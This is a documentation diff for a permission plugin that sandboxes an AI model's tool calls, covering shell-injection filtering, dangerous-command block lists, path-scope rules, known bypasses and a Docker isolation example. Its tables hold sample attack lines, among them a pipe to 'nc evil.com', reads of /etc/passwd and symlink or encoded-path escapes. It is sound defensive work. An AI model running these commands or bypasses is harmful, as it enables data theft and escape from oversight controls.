@@ -704,6 +704,187 @@ Or access the executor's context directly:
 executor._permission_context["turn_number"] = current_turn
 ```
 
+## Sandboxing and Sanitization
+
+The permission plugin includes sanitization features to help sandbox the model's tool execution. These provide **application-level** security that complements (but does not replace) **OS-level** isolation.
+
+### Enabling Sanitization
+
+**Via permissions.json:**
+```json
+{
+  "defaultPolicy": "deny",
+  "sanitization": {
+    "enabled": true,
+    "block_shell_metacharacters": true,
+    "block_dangerous_commands": true,
+    "allowed_dangerous_commands": [],
+    "custom_blocked_commands": ["custom_cmd"],
+    "path_scope": {
+      "enabled": true,
+      "allowed_roots": ["."],
+      "block_absolute": true,
+      "block_parent_traversal": true,
+      "allow_home": false
+    }
+  }
+}
+```
+
+**Programmatically:**
+```python
+from shared.plugins.permission import PermissionPolicy, create_strict_config
+
+policy = PermissionPolicy.from_config(config)
+policy.enable_strict_sandbox(cwd="/path/to/workspace")
+
+# Or manually:
+policy.set_sanitization(
+    config=create_strict_config("/path/to/workspace"),
+    cwd="/path/to/workspace"
+)
+```
+
+### Sanitization Features
+
+#### Shell Injection Prevention
+
+Blocks shell metacharacters and injection patterns:
+
+| Blocked | Example | Attack Vector |
+|---------|---------|---------------|
+| `;` | `ls; cat /etc/passwd` | Command chaining |
+| `\|` | `ls \| nc evil.com 80` | Pipe to exfiltration |
+| `&` | `malware &` | Background execution |
+| `` ` `` | `` ls `whoami` `` | Command substitution |
+| `$()` | `$(cat /etc/passwd)` | Command substitution |
+| `${}` | `${HOME}` | Variable expansion |
+| `>` `<` | `> /etc/passwd` | Redirection |
+
+#### Dangerous Command Blocking
+
+Blocks known dangerous commands by default:
+
+| Category | Commands |
+|----------|----------|
+| Privilege escalation | `sudo`, `su`, `doas`, `pkexec` |
+| System control | `shutdown`, `reboot`, `halt`, `init` |
+| Destructive | `rm`, `rmdir`, `mkfs`, `dd`, `shred` |
+| Network | `curl`, `wget`, `nc`, `ssh`, `scp`, `ftp` |
+| Process control | `kill`, `killall`, `pkill` |
+| Permissions | `chmod`, `chown`, `chgrp` |
+
+Override with `allowed_dangerous_commands`:
+```json
+{
+  "sanitization": {
+    "enabled": true,
+    "block_dangerous_commands": true,
+    "allowed_dangerous_commands": ["rm", "curl"]
+  }
+}
+```
+
+#### Path Scope Validation
+
+Restricts file access to allowed directories:
+
+```json
+{
+  "sanitization": {
+    "enabled": true,
+    "path_scope": {
+      "enabled": true,
+      "allowed_roots": [".", "./data", "/tmp/workspace"],
+      "block_absolute": true,
+      "block_parent_traversal": true,
+      "allow_home": false
+    }
+  }
+}
+```
+
+| Path | `block_absolute` | `block_parent_traversal` | Result |
+|------|------------------|--------------------------|--------|
+| `./file.txt` | - | - | ALLOWED |
+| `/etc/passwd` | true | - | BLOCKED |
+| `../secret.txt` | - | true | BLOCKED |
+| `~/private.key` | - | - | BLOCKED (if `allow_home: false`) |
+| `./foo/../../../etc/passwd` | - | true | BLOCKED |
+
+### What Sanitization Does NOT Prevent
+
+**Application-level sanitization has limits.** These attacks can bypass it:
+
+| Attack | Example | Why It Bypasses |
+|--------|---------|-----------------|
+| Symlink attacks | `ln -s /etc/passwd ./safe` | Path resolves after link creation |
+| Encoded paths | `cat %2e%2e/etc/passwd` | URL encoding |
+| Time-of-check attacks | Race conditions | Check vs execution gap |
+| Indirect exfiltration | `python -c "..."` | Arbitrary code execution |
+
+### OS-Level Sandboxing (Required for Production)
+
+For true isolation, wrap execution in OS-level sandboxes:
+
+```
+┌──────────────────────────────────────────────────────────────┐
+│ Application Layer (this plugin)                               │
+│ - Permission policies (blacklist/whitelist)                  │
+│ - Sanitization (shell injection, path scope)                 │
+│ - Actor approval                                              │
+└──────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌──────────────────────────────────────────────────────────────┐
+│ OS Layer (REQUIRED for production)                           │
+│ - Containers (Docker, Podman, gVisor)                        │
+│ - Namespaces (PID, network, mount, user)                     │
+│ - seccomp profiles (syscall filtering)                       │
+│ - cgroups (resource limits)                                  │
+│ - Read-only filesystems                                      │
+│ - Network isolation (no outbound by default)                 │
+└──────────────────────────────────────────────────────────────┘
+```
+
+**Example Docker sandbox:**
+```python
+import subprocess
+
+def sandboxed_execute(command: str, workspace: str) -> dict:
+    result = subprocess.run([
+        "docker", "run", "--rm",
+        "--network=none",              # No network access
+        "--read-only",                 # Read-only root filesystem
+        f"--workdir=/workspace",
+        f"-v={workspace}:/workspace",  # Mount workspace
+        "--memory=512m",               # Memory limit
+        "--cpus=1",                    # CPU limit
+        "--pids-limit=100",            # Process limit
+        "--security-opt=no-new-privileges",
+        "sandbox-image:latest",
+        "sh", "-c", command
+    ], capture_output=True, text=True, timeout=30)
+
+    return {
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "returncode": result.returncode
+    }
+```
+
+### Defense in Depth Checklist
+
+| Layer | Protection | Status |
+|-------|------------|--------|
+| **Application** | Permission plugin | This plugin |
+| **Application** | Sanitization (shell, paths) | This plugin |
+| **Application** | Audit logging | This plugin (ledger) |
+| **OS** | Container isolation | Implement separately |
+| **OS** | Network isolation | Implement separately |
+| **OS** | Resource limits | Implement separately |
+| **OS** | Syscall filtering | Implement separately |
+
 ## Security Considerations
 
 1. **Fail-safe defaults**: Permission check failures result in DENY
@@ -711,6 +892,8 @@ executor._permission_context["turn_number"] = current_turn
 3. **Session isolation**: Session rules don't persist across runs
 4. **Audit trail**: All decisions logged to ledger for review
 5. **Timeout handling**: Actor timeouts default to DENY (configurable)
+6. **Sanitization runs first**: Before blacklist/whitelist checks
+7. **Defense in depth**: Application controls + OS isolation required
 
 ## File Locations
 
